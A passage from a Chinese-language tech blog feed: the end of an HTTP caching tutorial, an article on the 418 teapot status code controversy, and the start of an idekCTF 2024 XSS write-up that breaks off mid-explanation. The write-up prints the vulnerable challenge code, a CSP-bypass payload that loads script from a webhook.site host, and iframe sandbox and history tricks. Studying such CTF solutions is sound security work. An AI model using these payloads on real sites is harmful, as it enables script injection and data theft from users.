但假如使用者是過 60 秒之後才重新整理，瀏覽器就會發送新的 Request。 仔細觀察 Google Logo 檔案的 Response header，你會發現它的max-age設定成31536000秒，也就是 365 天的意思。只要你在一年之內造訪這個網站，都不會對 Google logo 這張圖片送出 Request，而是會直接使用瀏覽器已經快取住的 Response，也就是這邊寫的Status code 200 (from memory cache)。 現在就碰到一個問題了，既然Expires跟max-age都可以決定一個 Response 是否過期，那如果兩個同時出現，瀏覽器要看哪一個呢？ 根據RFC2616的定義： If a response includes both an Expires header and a max-age directive, the max-age directive overrides the Expires header, even if the Expires header is more restrictive max-age會蓋過Expires。因此現在的快取儘管兩個都會放，但其實真正會用到的是max-age。 過期了，然後呢？上面這兩個 Header 都是在關注一個 Response 的「新鮮度(freshness)」，如果 Response 夠新鮮的話（也就是還沒超過Expire或者是在max-age規定的期限裡面），就直接從快取裡面拿資料。如果過期了、不新鮮了，就發送 Request 去跟 Server 拿新的資料。 但是這邊要特別注意一點：「過期了不代表不能用」 這是什麼意思呢？剛剛有提到說 Google 的 Logo 快取時間是一年，一年之後瀏覽器就會重新發出 Request 對吧？可是很有可能 Google 的 Logo 在一年之後也不會換，代表其實瀏覽器快取起來的圖片還是可以用的。 如果是這種情況，那 Server 就不必返回新的圖片，只要跟瀏覽器說：「你快取的圖片可以繼續用一年喔」就可以了。 Last-Modified 與 If-Modified-Since想要做到上面的功能，必須要 Server 跟 Client 兩邊互相配合才行。其中一種做法就是使用 HTTP 1.0 就有的：Last-Modified與If-Modified-Since的搭配使用。 在 Server 傳送 Response 的時候，可以多加一個Last-Modified的 Header，表示這個檔案上一次更改是什麼時候。而當快取過期，瀏覽器下次再發送 Request 的時候，就可以利用這個資訊，改用If-Modified-Since來跟 Server 指定拿取：某個時間點以後有更改的資料。 直接舉一個例子吧，假設我要求 Google 首頁的圖片檔案，收到了這樣的 Response（為了方便閱讀，日期的格式有更改過，實際上的內容不會是這樣）： Last-Modified: 2017-01-01 13:00:00 Cache-Control: max-age&#x3D;31536000 瀏覽器收到之後就會把這張圖片存進快取，並且標明這個檔案的最後更新時間是：2017-01-01 13:00:00，過期時間是一年後。 如果在半年後我重新請求這張圖片，瀏覽器就會跟我說：「你不用重新請求喔，這一份檔案的過期時間是一年，現在才過了半年。你要資料是吧？我這邊就有囉！」，於是就不會發送任何 Request，而是直接從瀏覽器那邊獲得資料。 接著我在過了一年之後再請求一次這張圖片，瀏覽器就會說：「嗯嗯，我這邊的快取的確過期了，我幫你去 Server 問一下檔案從2017-01-01 13:00:00以後有沒有更新」，會發送出下面這樣的 Request： GET &#x2F;logo.png If-Modified-Since: 2017-01-01 13:00:00 假設檔案確實更新了，那瀏覽器就會收到一份新的檔案。如果新的檔案一樣有那些 Cache 的 Header，就一樣會快取起來，跟上面的流程都一樣。那假設檔案沒有更新呢？ 假設沒有更新的話，Server 就會回一個Status code: 304 (Not Modified)，代表你可以繼續沿用快取的這份檔案。 Etag 與 If-None-Match雖然上面的這個方法看起來已經很好了，但還是有一個小問題。 上面講的是檔案有沒有被「編輯」過，但其實這個編輯時間就是你電腦上檔案的編輯時間。若是你打開檔案什麼都不做，然後存檔，這個編輯時間也會被更新。可是儘管編輯時間不一樣，檔案的內容還是一模一樣的。 比起編輯時間，若是能用「檔案內容更動與否」來當作是否要更新快取的條件，那是再好不過了。 而Etag這個 Header 就是這樣的一個東西。你可以把 Etag 想成是這份檔案內容的 hash 值（但其實不是，但原理類似就是了，總之就是一樣的內容會產生一樣的 hash，不一樣的會產生不一樣的 hash）。 在 Response 裡面 Server 會帶上這個檔案的 Etag，等快取過期之後，瀏覽器就可以拿這個 Etag 去問說檔案是不是有被更動過。 Etag跟If-None-Match也是搭配使用的一對，就像Last-Modified跟If-Modified-Since一樣。 Server 在回傳 Response 的時候帶上Etag表示這個檔案獨有的 hash，快取過期後瀏覽器發送If-None-Match詢問 Server 是否有新的資料（不符合這個Etag的資料），有的話就回傳新的，沒有的話就只要回傳 304 就好了。 流程可以參考 Google 網站上的下圖： （圖片來源：https://web.dev/articles/http-cache ） 中場休息讓我們來總結一下到目前為止學到的東西： Expires跟Cache-Control: max-age決定這份快取的「新鮮度」，也就是什麼時候「過期」。在過期之前，瀏覽器「不會」發送出任何 Request 當快取過期之後，可以用If-Modified-Since或是If-None-Match詢問 Server 有沒有新的資源，如果有的話就回傳新的，沒有的話就回傳 Status code 304，代表快取裡面的資源還能繼續沿用。 有了這幾個 Header 之後，世界看似美好，好像所有的問題都解決了一樣。 是的，我說「好像」，代表其實還有一些問題存在。 不要快取怎麼辦？有一些頁面可能會不想要任何的快取，例如說含有一些機密資料的頁面，就不希望任何的東西被保留在 Client 端。 還記得我們一開始有提過Cache-Control這個 Header 其實解決了更多問題嗎？除了可以指定max-age以外，可以直接使用：Cache-Control: no-store，代表說：「我就是不要任何快取」。 因此每一次請求都必定會到達 Server 去要求新的資料，不會有任何資訊被快取住。 （註：HTTP 1.0 裡面有一個Pragma的 Header，使用方法只有一種，就是：Pragma: no-cache，有網路上的資料說它就是不要任何快取的意思，但根據RFC7232的說法，這個用法應該跟Cache-Control: no-cache一樣，而不是Cache-Control: no-store，這兩個的差異等等會提到） 首頁的快取策略剛剛上面提到的都是一些靜態資源例如說圖片，特性就是會有好一陣子不會變動，因此可以放心地使用max-age。 但現在我們考慮到另外一種狀況，那就是網站首頁。 網站首頁雖然也不常會變動，但我們希望只要一變動，使用者就能夠馬上看到變化。那要怎麼辦呢？設max-age嗎？也是可以，例如說Cache-Control: max-age=30，只要過 30 秒就能讓快取過期，去跟 Server 拿新的資料。 但如果我們想要更即時呢？只要一變動，使用者就能夠馬上看到變化。你可能會說：「那我們可以不要快取就好啦，每次都抓取新的頁面」。可是如果這個首頁有一個禮拜都沒有變，其實使用快取會是比較好的辦法，節省很多流量。 因此我們的目的是：「把頁面快取起來，但只要首頁一變動，就能夠立刻看到新的頁面」 這個怎麼做到呢？第一招，你可以用Cache-Control: max-age=0，這就代表說這個 Response 0 秒之後就會過期，意思是瀏覽器一接收到，就會標示為過期。這樣當使用者再次造訪頁面，就會去 Server 詢問有沒有新的資料，再搭配上Etag來使用，就可以保證只會下載到最新的 Response。 例如說第一個 Response 可能是這樣： Cache-Control: max-age&#x3D;0 Etag: 1234 我重新整理一次，瀏覽器發出這樣的 Request： If-None-Match: 1234 如果檔案沒有變動，Server 就會回傳：304 Modified，有變動的話就會回傳新的檔案並且更新Etag。如果是使用這種方式，其實就是「每一次造訪頁面都會發送一個 Request 去確認有沒有新的檔案，有的話就下載更新，沒有的話沿用快取裡的」。 除了上面這招max-age=0，其實有一個已經規範好的策略叫做：Cache-Control: no-cache。no-cache並不是「完全不使用快取的意思」，而是跟我們上面的行為一樣。每次都會發送 Request 去確認是否有新的檔案。 （註：其實這兩種還是有很細微的差別，可參考What’s the difference between Cache-Control: max-age&#x3D;0 and no-cache?） 如果要「完全不使用快取」，是Cache-Control: no-store。這邊不要搞混了。 為了怕大家搞混，我再講一次這兩個的差異： 假設 A 網站是使用Cache-Control: no-store，B 網站是使用Cache-Control: no-cache。 當每一次重新造訪同樣一個頁面的時候，無論 A 網站有沒有更新，A 網站都會傳來「整份新的檔案」，假設index.html有 100 kb 好了，造訪了十次，累積的流量就是 1000kb。 B 網站的話，我們假設前九次網站都沒有更新，一直到第十次才更新。所以前九次 Server 只會回傳 Status code 304，這個封包大小我們姑且算作 1kb 好了。第十次因為有新的檔案，會是 100kb。那十次加起來的流量就是 9 + 100 &#x3D; 109 kb 可以發現 A 跟 B 達成的效果一樣，那就是「只要網站更新，使用者就能立即看到結果」，但是 B 的流量遠低於 A，因為有善用快取策略。只要每一次 Request 都先確認網站有沒有更新即可，不用每一次都抓完整的檔案下來。 這就是no-store跟no-cache的差異，永遠不用快取跟永遠檢查快取。 最後一個問題現在 Web App 當道，許多網站都是採用 SPA 的架構搭配 Webpack 打包。前端只需要引入一個 JavaScript 的檔案，Render 就交給 JavaScript 來做就好。 這類型的網站，HTML 可能長得像這樣： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body 為空，所有內容都交給 js 去 render --> &lt;/body> &lt;/html> 當 JavaScript 載入之後，利用 JavaScript 把頁面渲染出來。 面對這種情境，我們就會希望這個檔案能夠跟上面的首頁檔案一樣，「只要檔案更新，使用者能夠立即看到新的結果」，因此我們可以用Cache-Control: no-cache來達成這個目標。 可是呢，還記得剛說過no-cache其實就是每一次訪問頁面，都去 Server 問說有沒有新的結果。意思就是無論如何，都會發出 Request。 有沒有可能，連 Request 都不發呢？ 意思就是：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」 前者其實就是我們一開始講的max-age在做的事，但max-age沒辦法做到判斷「檔案不更新」這件事情。 所以其實這個目標，沒辦法單靠上面我們介紹的這些瀏覽器的快取機制來達成，需要 Server 那邊一起配合才行。其實說穿了，就是把 Etag 的機制自己實作在檔案裡面。 什麼意思呢？我們直接來看一個範例，我們把index.html改成這樣： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script-qd3j2orjoa.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body 為空，所有內容都交給 js 去 render --> &lt;/body> &lt;/html> 注意到 JavaScript 的檔名變成：script-qd3j2orjoa.js，後面其實就跟 Etag 一樣，都是代表這個檔案的 hash 值。然後我們把這個檔案的快取策略設成：Cache-Control: max-age=31536000。 這樣子這個檔案就會被快取住一年。一年之內都不會對這個 URL 發送新的 Request。 那如果我們要更新的話怎麼辦呢？我們不要更新這個檔案，直接更新index.html，換一個 JavaScript 檔案： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;link rel='stylesheet' href='style.css'>&lt;/link> &lt;script src='script-8953jief32.js'>&lt;/script> &lt;/head> &lt;body> &lt;!-- body 為空，所有內容都交給 js 去 render --> &lt;/body> &lt;/html> 因為index.html的快取策略是no-cache，所以每一次訪問這個頁面，都會去看index.html是否更新。 以現在這個例子來說，它的確更新了，因此新的這份就會傳回給瀏覽器。而瀏覽器發現有新的 JavaScript 檔案就會去下載並且快取起來。 藉由把 Etag 的機制實作在index.html裡面，我們就達成了我們的目標：「只要檔案不更新，瀏覽器就不會發 Request，直接沿用快取裡的即可。只要檔案一更新，瀏覽器就要立即抓取新的檔案」 原理就是針對不同的檔案採用不同的快取策略，並且直接用「更換 JavaScript 檔案」的方式強制瀏覽器重新下載。 這邊也可以參考 Google 提供的圖片： （圖片來源：https://web.dev/articles/http-cache ） 總結之所以快取的機制會有點小複雜，是因為分成不同的部分，每一個相關的 Header 其實都是在負責不同的部分。例如說Expires跟max-age是在負責看這個快取是不是「新鮮」，Last-Modified, If-Modified-Since, Etag, If-None-Match是負責詢問這個快取能不能「繼續使用」，而no-cache與no-store則是代表到底要不要使用快取，以及應該如何使用。 這篇文章其實只講到快取機制的一半，沒有提到的部分大致上都跟 shared cache 以及 proxy server 有關，有其他的值是在決定快取能不能被存在 proxy server 上？或者是驗證能否繼續使用的時候應該要跟原 server 驗證，還是跟 proxy server 驗證也可以。有興趣想要知道更多的讀者們可以參考底下的參考資料。 最後，希望這篇文章能讓初學者更理解 HTTP 的快取機制。 參考資料 彻底弄懂 Http 缓存机制 - 基于缓存策略三要素分解法 浅谈浏览器http的缓存机制 【Web缓存机制系列】1 – Web缓存的作用与类型 HTTP缓存控制小结 MDN - Cache-Control rfc2616 Google Web Fundamentals HTTP 1.0 spec","link":"/2017/08/27/http-cache/"},{"title":"搶救茶壺大作戰：418 I am a teapot","text":"前言有許多的 HTTP Status Code 大家都耳熟能詳，例如說 404 Not Found、500 Internal Server Error 以及 200 OK 等等。 在眾多的狀態碼之中，有一個擺明就是來搞笑的：418 I’m a teapot。 但你知道嗎，它不在 HTTP 標準裡面，所以根本不是標準的 HTTP 狀態碼。你可能會想說：「我都看過 RFC 了，怎麼會不是？」。但那份 RFC 也跟 HTTP 一點關係都沒有，不過滿多人都沒注意到這點。 我一開始也沒注意到這件事，以為 418 是 HTTP 標準的其中一部分，一直到 2017 年 8 月時有人在 Node.js 的 GitHub 發了一個 Issue：418 I’m A Teapot 我才注意到。 Issue 裡面提到希望能移除對 418 的 support，而發起 Issue 的作者在被人告知 Go 也這樣搞的時候，也跑去 Go 發了一個 Issue。 那時候這起要求移除 418 狀態碼的事件其實引發了不小的風波，而大部分人其實是反對移除這個狀態碼的。甚至還有人做了一個 save418.com，想要拯救 418。 前陣子花了點時間研究一下整件事情的來龍去脈，在整理的過程中也發現無論贊成或是反對，這其中的理由都很值得我們去思考，因此在此總結成一篇文章跟大家分享。 418 的由來418 的由來可以追溯到 1998 年 4 月 1 日愚人節的這一份文件：RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0)，HTCPCP 是 Hyper Text Coffee Pot Control Protocol 的簡稱，總之這份 RFC 描述了一個叫做 HTCPCP 的協定，建立在 HTTP 之上，並且可以利用這個協定來泡咖啡。 講到 418 的部分在 Section 2.3.2： 2.3.2 418 I’m a teapot Any attempt to brew coffee with a teapot should result in the error code “418 I’m a teapot”. The resulting entity body MAY be short and stout. 大意就是如果有人想用茶壺來泡咖啡，你應該回個它一個 418 的狀態碼，我是個茶壺，你幹嘛拿我來泡咖啡？ 這邊值得注意的只有一件事，那就是 418 是在 HTCPCP 這個協定裡面，並不是 HTTP。所以 418 並不是 HTTP 協定的標準狀態碼。 移除 418 的風波在 2017 年 8 月 5 日，Mark Nottingham 在 Node.js 的 GitHub 發了這樣的一個 Issue： Node implements the 418 I’m a Teapot status code in a few places. Its source is RFC2324, Hyper Text Coffee Pot Control Protocol (HTCPCP&#x2F;1.0). Note the title - HTCPCP&#x2F;1.0 is not HTTP&#x2F;1.x. HTCPCP was an April 1 joke by Larry to illustrate how people were abusing HTTP in various ways. Ironically, it’s not being used to abuse HTTP itself – people are implementing parts of HTCPCP in their HTTP stacks. In particular, Node’s support for the HTCPCP 418 I’m a Teapot status code has been used as an argument in the HTTP Working Group to preclude use of 418 in HTTP for real-world purposes. While we have a number of spare 4xx HTTP status codes that are unregistered now, the semantics of HTTP are something that (hopefully) are going to last for a long time, so one day we may need this code point. Please consider removing support for 418 from Node, since it’s not a HTTP status code (even by its own definition). I know it’s amusing, I know that a few people have knocked up implementations for fun, but it shouldn’t pollute the core protocol; folks can extend Node easily enough if they want to play with non-standard semantics. Thanks, 裡面請求 Node 把 418 的支援移除，理由是 418 並不是 HTTP 標準的狀態碼，而且 4xx 的狀態碼雖然還有很多，但若是我們希望 HTTP 能盡量活得長久，我們終究有一天需要用到這個狀態碼的。 底下引起了一番討論之後，有人指出 Go 也實作了 418，因此 Mark Nottingham 就跑到了 Go 的 GitHub 去，也發了一個相似的 Issue：net&#x2F;http: remove support for status code 418 I’m a Teapot。 這兩個 Issue 其實都很值得一看，裡面有許多很有建設性的討論。下面我整理幾個支持與反對的論點。 反對移除：418 是無害的 418 是個無害的彩蛋，而且很有趣，離我家的 418 遠一點！ 我覺得這論點滿無力的，只要證明 418 其實是有害的就好。 支持移除：萬一以後有人要用 418 怎麼辦？ 你說 418 無害，不對啊，如果我們希望 HTTP 能活得久，那遲早會有 418 會需要被用到的一天，到那天他就是別的意思了。就算你把 418 保留起來，也是少了一個狀態碼可以用 這一點我覺得滿有趣的。的確，照這種說法 418 佔了一個位置，以後能用的狀態碼就少了一個。但問題是這「一個」重要嗎？可以搭配下面的反對論點一起看。 反對移除：418 只佔了一個空間，問題不在 418如果 4xx 都快用完的那天真的來臨了，該檢討的是 HTTP 的設計，還是檢討狀態碼不夠用？如果真的只剩一個可以用，是不是代表還有更大的問題該解決？ 之所以這點我覺得很有趣，是因為這跟我們平時在寫程式會碰到的問題滿像的。有時候你會擔心自己是不是過早最佳化（Premature Optimization）或是過度工程化（Over Engineering），做了完全不需要用到的優化。 假設今天有一個程式，用 1~100 這 100 個數字來表示不同狀態。隨著時間我們會需要不同的數字來表示不同狀態，所以能用的數字會愈來愈少，而我們又希望這程式能夠活得長久。在這種情況下，你贊成我們拿其中一個數字來當彩蛋嗎？ 如果你反對，認為每一個數字都很重要，不該隨意拿一個數字出來當彩蛋，就代表你認為 418 是該被移除的。 但我自己對這題的看法是一個數字根本無關緊要。 理由是，若是你真的把 99 個數字用完了，就算我拿去當彩蛋的數字還你，你依然在不久後會用完所有的數字。到那個時候，你還是需要找新的解法。所以只差一個數字根本差不了多少。 支持移除：418 不在 HTTP 標準內這是我覺得最有力的論點。 大家都知道 418 是個彩蛋，也知道它很有趣，可是它終究不是 HTTP 標準的一部分。今天你如果要實作一個「遵循 HTTP 標準」的程式，你就不應該把 418 放進去，因為它不在裡面。在 IANA 裡面 418 也是 Unassigned 的狀態。 如果你今天是市井小民，想要在自己家的伺服器或是 App 裡面實作 418，那沒有人會干擾你。但對於 Node.js、Go 這種專案來說，就應該遵守規範來開發。 這點也可以延伸到平常開發產品時會碰到的問題。如果 PM 規格寫不清楚，工程師要嘛自己通靈，要嘛就叫 PM 把模糊的地方寫清楚一點，最好是不要有任何個人的解釋空間，越清楚越好。 當今天 PM 把規格書寫得超級清楚，工程師卻自己偷偷加了一個額外的彩蛋，這是合理的嗎？這彩蛋可能無關緊要，可能只有工程師自己知道怎麼打開，但無論如何還是超出了規格之外。 在思考 418 的去留問題時，你可能只看見 418。但我認為你在碰到 418 問題時所做出的選擇，都跟你平時開發會碰到的問題有關。而且有趣的是，你有可能在 418 時選了 A，卻在類似的開發問題上選了 B，兩者是互相衝突的。 以我個人的立場來說，418 不在標準內這個理由很有力。不過以情感上來說我是不希望它被移除的，幸好還有一個反對的論點也滿有力的。 反對移除：418 已經被誤用太久了在做版本更新時，有一個很重要的點是要維持向下相容（backward compatible），如果不是什麼太重要的事，盡量不要有 breaking change。 而這個論點講的是 418 作為一個「被誤認為是 HTTP 標準」的狀態碼已經十幾年了，所以每一個主流的函式庫幾乎都有支援 418（你看 Node.js 跟 Go 都有支援），若是今天把 418 的支援拔掉了，那以前使用到 418 的 Server 怎麼辦？ 這論點我也覺得滿有力的，418 已經被誤用太久，拔掉之後會產生的問題似乎比維持現狀還要多。從這點來看，它是不該被移除的。 418 的後續發展及現況當初 Mark Nottingham 發表了希望移除 418 的 Issue 之後，有些人覺得他是來鬧的，吃飽太閒才會把想法動到 418 身上去。 但如果你點進他的 GitHub，可以看到他的自我介紹： I work on HTTP specifications and implementations. 他原本就參與了各個跟 HTTP 標準相關的組織，而且在這個領域做了不少的貢獻。 在社群掀起了反對聲浪以後，他也決定從原本的移除 418 轉變為保留 418 的立場： So, I poked a couple of implementations to see if they’d remove 418’s “teapot” semantics, and there was a reaction (to put it mildly). I think we need to reserve 418 to make it clear it can’t be used for the foreseeable future （來源：http-wg 的 mailing list: Reserving 418） 於是起草了一份文件：Reserving the 418 HTTP Status Code，裡面說明要把 418 的狀態設定為保留，不能被其他人註冊走： [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of the application-specific 418 (I’m a Teapot) status code. In the intervening years, this status code has been widely implemented as an “easter egg”, and therefore is effectively consumed by this use. This document changes 418 to the status of “Reserved” in the IANA HTTP Status Code registry to reflect that. 當初研究這整件事情到這裡時，看到這份草稿的資訊發現已經過期了（Expires: February 12, 2018），到 IANA HTTP Status Code registry 看，發現 418 一樣是 Unassigned。 線索就到這邊全部斷掉了，所以 418 最後到底怎麼樣了？會變成保留中嗎？ 於是我寫了封信去問 Mark Nottingham 本人，他只丟給我一個連結：https://github.com/httpwg/http-core/issues/43。 從這個 Issue 可以找到這個 PR：Reserve 418 status code，裡面更動了draft-ietf-httpbis-semantics-latest.xml這個檔案。而在 httpwg 的網站上也可以找到現在最新的草稿：https://httpwg.org/http-core/draft-ietf-httpbis-semantics-latest.html。 在最新的草稿裡面，多了這段： 9.5.19. 418 (Unused) [RFC2324] was an April 1 RFC that lampooned the various ways HTTP was abused; one such abuse was the definition of an application-specific 418 status code. In the intervening years, this status code has been widely implemented as an “Easter Egg”, and therefore is effectively consumed by this use. Therefore, the 418 status code is reserved in the IANA HTTP Status Code registry. This indicates that the status code cannot be assigned to other applications currently. If future circumstances require its use (e.g., exhaustion of 4NN status codes), it can be re-assigned to another use. 看起來是把 418 先保留起來，但如果日後 4XX 的狀態碼真的用完，還是可以把 418 拿去做其他的用途。 而 httpwg 的網站上也能找到目前最新的 HTTP&#x2F;1.1 的標準：Hypertext Transfer Protocol (HTTP&#x2F;1.1): Semantics and Content，裡面是沒有 418 的。 因此我自己的猜測是在最新的草稿裡面已經把 418 放進去了並且設成保留，但是還沒有正式發表（背後應該還有一堆流程，這部分要去研究 HTTP Working Group 的規章才能知道），不過在日後應該可以看見草稿發布並成為正式的標準。 總結這樣看下來，418 I am a teapot 依舊不會是 HTTP 的標準。畢竟應該有些人跟我想的一樣，只要把 418 I am a teapot 變成 HTTP 標準的一部分，問題就解決了，但最後沒有這樣做我猜是會碰到一些問題（至於是什麼問題我也不知道，有人知道的話麻煩提點，感謝）。 最後的結論應該是 418 這個狀態碼依然會繼續以 I am a teapot 存在於各個主流的 HTTP 實作裡面，但依舊不是 HTTP 標準的一部分。在標準裡面 418 狀態碼是被設定為 (Unused) 而且暫時被保留著，不會被其他用途給取代。 這篇的目的主要就是想記錄一下 418 狀態碼的過去以及現在，並且讓大家知道它並不是 HTTP 標準的一部分。除此之外，在研究的過程中也聯想到了許多開發上會碰到的問題，其實背後的核心概念都是差不多的。 其實在寫這篇的時候猶豫了許久，因為很怕自己有地方會寫錯（參考資料太多太豐富），不過想起了之前忘記在哪看到的一句話：「比起提問，有個更快能得到正確答案的方法。那就是講一個錯的答案，就會有人來糾正你了」。 延伸閱讀： HN 的討論 HN 的討論 - 2","link":"/2019/06/14/http-status-code-418-teapot/"},{"title":"idekCTF 2024 筆記之 iframe 高級魔法","text":"在 idekCTF 2024 中，由 icesfont 所出的一道題目 srcdoc-memos 十分有趣，牽涉到了許多 iframe 的相關知識。我沒有實際參加比賽，但賽後看了題目以及解法，還是花了好幾天才終於看懂為什麼，十分值得把過程以及解法記錄下來。 由於這題牽涉到不少與 iframe 相關的知識，我會盡量一步一步來，會比較好理解。 srcdoc-memos題目連結：https://github.com/idekctf/idekctf-2024/tree/main/web/srcdoc-memos 這題的程式碼如下，目標是達成 XSS 偷到預先設置好的 flag： const escape = html => html .replaceAll('\"', \"&amp;quot;\") .replaceAll(\"&lt;\", \"&amp;lt;\") .replaceAll(\">\", \"&amp;gt;\"); const handler = (req, res) => &#123; const url = new URL(req.url, \"http://localhost\"); let memo; switch (url.pathname) &#123; case \"/\": memo = cookie.parse(req.headers.cookie || \"\").memo ?? `&lt;h2>Welcome to srcdoc memos!&lt;/h2>\\n&lt;p>HTML is supported&lt;/p>`; res.setHeader(\"Content-Type\", \"text/html; charset=utf-8\"); res.end(` &lt;script> document.head.insertAdjacentHTML( \"beforeend\", \\`&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\">\\` ); if (window.opener !== null) &#123; console.error(\"has opener\"); document.documentElement.remove(); &#125; &lt;/script> &lt;h1>srcdoc memos&lt;/h1> &lt;div class=\"horizontal\"> &lt;iframe srcdoc=\"$&#123;escape(memo)&#125;\">&lt;/iframe> &lt;textarea name=\"memo\" placeholder=\"&lt;b>TODO&lt;/b>: ...\" form=\"update\">$&#123;escape(memo)&#125;&lt;/textarea> &lt;/div> &lt;form id=\"update\" action=\"/memo\"> &lt;input type=\"submit\" value=\"update memo\"> &lt;/form> `.trim()); break; case \"/memo\": memo = url.searchParams.get(\"memo\") ?? \"\"; res.statusCode = 302; res.setHeader(\"Set-Cookie\", cookie.serialize(\"memo\", memo)); res.setHeader(\"Location\", \"/\"); res.end(); break; default: res.statusCode = 404; res.setHeader(\"Content-Type\", \"text/plain; charset=utf-8\"); res.end(\"not found\"); &#125; &#125;; 其實題目本身的功能滿簡單，就是有一個 /memo?memo=xxx 的 API 可以設置 cookie，接著在訪問 index 的時候，會把內容放到 srcdoc 去，但最重要的是同個頁面上有一段 script： &lt;script> document.head.insertAdjacentHTML( \"beforeend\", \\`&lt;meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'none';\">\\` ); if (window.opener !== null) &#123; console.error(\"has opener\"); document.documentElement.remove(); &#125; &lt;/script> 主要會做兩件事情： 加上 script-src none 的 CSP 如果有 opener，就把內容移除掉 困難點先別管 opener 那個，那個比較好解決，難的是 CSP。 看完題目之後我的思考過程是這樣的，由於 &lt;iframe srcdoc&gt; 的 CSP 會繼承它的 parent，因此上層有的話，下層一定有，所以要想辦法把那個 CSP 弄掉，那既然要弄掉，我唯一能想到的就是透過 &lt;iframe csp&gt; 屬性先加上 CSP，就能阻止那段 script 的載入。 但由於這一題的內容是透過 cookie 帶入，所以會有 same-site cookie 的限制，在我們的 origin 是沒辦法插入 iframe 的，cookie 會有問題，因此一定要在題目的 origin 使用 &lt;iframe csp&gt;，除了這個以外，我想不到任何方式可以把 CSP 拿掉。 解法之所以會說 opener 比較好解決，是因為之前就有看過類似的題目。 要如何讓 opener 是 null 有幾個方法，第一個類似於 SekaiCTF 2022 - Obligatory Calc 中所出現過的，執行 window.open 之後就快速關閉自己，opener 就會是 null，這題的作者 icesfont 用的就是這個方法（如果是在 console 上測試，會發現執行以後什麼都不會發生，因為瀏覽器預設不能在沒有動作下就開啟新的 window，所以第二個 open 會被擋住）： function openNoOpener(url, name) &#123; open(URL.createObjectURL(new Blob([` &lt;script> open(\"$&#123;url&#125;\", \"$&#123;name&#125;\"); window.close(); &lt;\\/script> `], &#123; type: \"text/html\" &#125;))); &#125; 第二個方法我是在 Discord 裡面看到 Jazzy 提的，其實只要 open 之後自己把 opener 設成 null 就好： function openNoOpener(url, name) &#123; let w = window.open(url, name) w.opener = null &#125; 之所以可以這樣，是因為剛開啟之後會有一小段時間，開啟的 window 跟當前 window 是 same-origin，所以這一段時間是可以操作它的，接著才會被導到要前往的 URL。 雖然失去了 opener，表面上看起來跟開啟後的 window 脫節了，但其實利用 name 屬性就能夠再次存取到它，這點我以前有寫過：iframe 與 window.open 黑魔法。 解決了 opener 的問題以後，就可以來看另一個最麻煩的地方，就是那一段 script，如果能讓它不執行，那很輕鬆就能做到 XSS。但要怎麼讓它不執行呢？以前有寫過 iframe 上有個屬性叫做 csp，加上它之後就可以設置 CSP。 如同前面所說的，因為 same-site cookie，因此要直接利用題目的 memo 功能嵌入，程式碼如下（修改自 Jazzy 在 Discord 中提供的 payload）： &lt;script> const challengeHost = 'http://localhost:1337' function openNoOpener(url, name) &#123; let w = window.open(url, name) w.opener = null &#125; let html = ` html &lt;script src=\"http://webhook.site/0fdd5e6d-0882-44de-b593-212aecf604c1\">&lt;\\/script> &lt;iframe csp=\"script-src http: https:\" src=\"/\">&lt;/iframe> `; openNoOpener(`$&#123;challengeHost&#125;/memo?memo=$&#123;encodeURIComponent(html)&#125;`, 'main'); &lt;/script> 利用 CSP 不讓 inline script 執行，然後再載入一次網頁，就會執行原本準備好的 script。不過我實際試了一下，現在最新版會有錯誤： Refused to display ‘http://localhost:1337/‘ in a frame. The embedder requires it to enforce the following Content Security Policy: ‘script-src http: https:’. However, the frame neither accepts that policy using the Allow-CSP-From header nor delivers a Content Security Policy which is at least as strong as that one. 如果頁面原本沒有 csp 的話，是沒辦法硬要加上去的。從賽後討論看起來比較舊版的 Chrome 對於 same-origin 的 csp 似乎限制沒這麼嚴格，因此只有在舊版可以（不過我也不確定就是了，我懶得找舊版來試了）。 接著講一下預期解，預期解牽涉到了很多 iframe 相關的知識，我陸續花了大概一週才真的理解到底預期解為什麼可以 work，為了方便理解，我把它拆成幾個小部分，順著看完應該就可以理解最後的預期解了。 1. iframe 的 navigation由於 iframe 是一個獨立的 window，因此 iframe 本身當然也可以做 navigation，導去其他的地方。假設在網頁上有一個 iframe，原本的 src 是 A，接著你把 src 改成 B，此時如果按下上一頁（或是執行 history.back()），會發生什麼事情呢？有兩個可能性： 整個網頁（top level）回到上一頁 iframe 回到上一頁（從 B 回到 A） 答案是 2，也就是說，當你在做 navigation 的時候，iframe 的紀錄也會被加進整體的 history 裡面。 知道這個前提之後，就可以來看一個狀況： &lt;body> &lt;iframe sandbox id=f src=\"data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> &lt;button onclick=\"loadTest2()\">load test2&lt;/button> &lt;/body> &lt;script> function loadTest2() &#123; f.removeAttribute('sandbox') f.src = 'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\\/script>' &#125; &lt;/script> 先把 iframe 載入 test1，並且加上 sandbox，因此 script 不會執行 按下 loadTest2 按鈕，把 iframe sandbox 拿掉，導去 test2，因此 script 會執行 此時如果按下 back 按鈕，理所當然的 iframe 會回到 test1，但是 sandbox 可能會有兩種狀況： sandbox 也一起回到載入 test1 時的狀況 sandbox 維持現在的屬性，也就是沒有 sandbox 答案會是 2，sandbox 的屬性不會變，因此按下 back 之後，sandbox 沒了，test1 的 script 現在就可以執行了。 其實感覺也滿合理的，畢竟你只是改動 src 而已，沒有動 sandbox，因此 sandbox 維持在最新的狀態。 2. iframe reparenting 與 bfcache剛剛的狀況是更改 sandbox 並且載入新的 src 之後，回到上一頁。接下來我們再來看另一個狀況，前半段相同，但載入新的 src 之後，我們不直接回到上一頁，而是先把整個網頁跳轉到其他頁面，接著才回去： &lt;body> &lt;iframe sandbox id=f src=\"data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;/script>\">&lt;/iframe> &lt;button onclick=\"loadTest2()\">load test2&lt;/button> &lt;button onclick=\"location = 'a.html'\">top level navigation&lt;/button> &lt;/body> 